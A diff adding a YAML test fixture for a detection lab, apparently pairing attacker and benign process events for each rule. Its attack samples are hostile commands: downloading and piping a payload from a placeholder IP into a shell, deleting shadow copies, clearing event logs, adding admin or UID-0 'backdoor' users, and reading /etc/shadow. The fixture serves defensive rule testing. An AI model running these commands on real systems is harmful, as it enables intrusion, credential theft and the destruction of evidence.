@@ -1,0 +1,61 @@
+# Copyright (c) 2026 Adekunle Akeju. All rights reserved except as licensed.
+# Akeju Detection Lab, created by Adekunle Akeju. SPDX-License-Identifier: AGPL-3.0-or-later
+win_powershell_encoded_command:
+  attack:
+    - {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell.exe -nop -enc SQBFAFgA'}
+    - {Image: 'C:\Program Files\PowerShell\7\pwsh.exe', CommandLine: 'pwsh -encodedcommand SQBFAFgA'}
+  benign:
+    - {Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', CommandLine: 'powershell.exe -File backup.ps1'}
+    - {Image: 'C:\Windows\System32\cmd.exe', CommandLine: 'cmd /c echo -enc test'}
+win_certutil_download:
+  attack:
+    - {Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil -urlcache -split -f http://198.51.100.7/a.exe a.exe'}
+  benign:
+    - {Image: 'C:\Windows\System32\certutil.exe', CommandLine: 'certutil -hashfile a.exe SHA256'}
+win_schtasks_user_writable_path:
+  attack:
+    - {Image: 'C:\Windows\System32\schtasks.exe', CommandLine: 'schtasks /create /tn up /tr C:\Users\Public\a.exe /sc onlogon'}
+  benign:
+    - {Image: 'C:\Windows\System32\schtasks.exe', CommandLine: 'schtasks /create /tn up /tr C:\Tools\backup.exe /sc daily'}
+    - {Image: 'C:\Windows\System32\schtasks.exe', CommandLine: 'schtasks /query /tn \Temp\x'}
+win_shadow_copy_delete:
+  attack:
+    - {Image: 'C:\Windows\System32\vssadmin.exe', CommandLine: 'vssadmin delete shadows /all /quiet'}
+    - {Image: 'C:\Windows\System32\wbem\wmic.exe', CommandLine: 'wmic shadowcopy delete'}
+  benign:
+    - {Image: 'C:\Windows\System32\vssadmin.exe', CommandLine: 'vssadmin list shadows'}
+win_local_admin_added:
+  attack:
+    - {Image: 'C:\Windows\System32\net.exe', CommandLine: 'net localgroup administrators eviluser /add'}
+  benign:
+    - {Image: 'C:\Windows\System32\net.exe', CommandLine: 'net localgroup administrators'}
+    - {Image: 'C:\Windows\System32\net.exe', CommandLine: 'net localgroup users bob /add'}
+win_event_log_cleared:
+  attack:
+    - {Image: 'C:\Windows\System32\wevtutil.exe', CommandLine: 'wevtutil cl Security'}
+  benign:
+    - {Image: 'C:\Windows\System32\wevtutil.exe', CommandLine: 'wevtutil qe Security /c:5'}
+win_lsass_memory_access:
+  attack:
+    - {TargetImage: 'C:\Windows\System32\lsass.exe', GrantedAccess: '0x1410', SourceImage: 'C:\Users\Public\m.exe'}
+  benign:
+    - {TargetImage: 'C:\Windows\System32\lsass.exe', GrantedAccess: '0x1410', SourceImage: 'C:\Windows\System32\svchost.exe'}
+    - {TargetImage: 'C:\Windows\System32\lsass.exe', GrantedAccess: '0x400', SourceImage: 'C:\Users\Public\m.exe'}
+    - {TargetImage: 'C:\Windows\explorer.exe', GrantedAccess: '0x1410', SourceImage: 'C:\Users\Public\m.exe'}
+lnx_download_piped_to_shell:
+  attack:
+    - {Image: '/usr/bin/bash', CommandLine: 'bash -c curl -s http://198.51.100.7/x | sh'}
+    - {Image: '/usr/bin/bash', CommandLine: 'bash -c wget -qO- http://198.51.100.7/x|bash'}
+  benign:
+    - {Image: '/usr/bin/curl', CommandLine: 'curl -o file.tgz https://example.com/file.tgz'}
+lnx_shadow_file_read:
+  attack:
+    - {Image: '/usr/bin/cat', CommandLine: 'cat /etc/shadow'}
+  benign:
+    - {Image: '/usr/bin/cat', CommandLine: 'cat /etc/hosts'}
+    - {Image: '/usr/sbin/unix_chkpwd', CommandLine: 'unix_chkpwd /etc/shadow'}
+lnx_second_root_user:
+  attack:
+    - {Image: '/usr/sbin/useradd', CommandLine: 'useradd -o -u 0 -g 0 backdoor'}
+  benign:
+    - {Image: '/usr/sbin/useradd', CommandLine: 'useradd -u 1001 alice'}
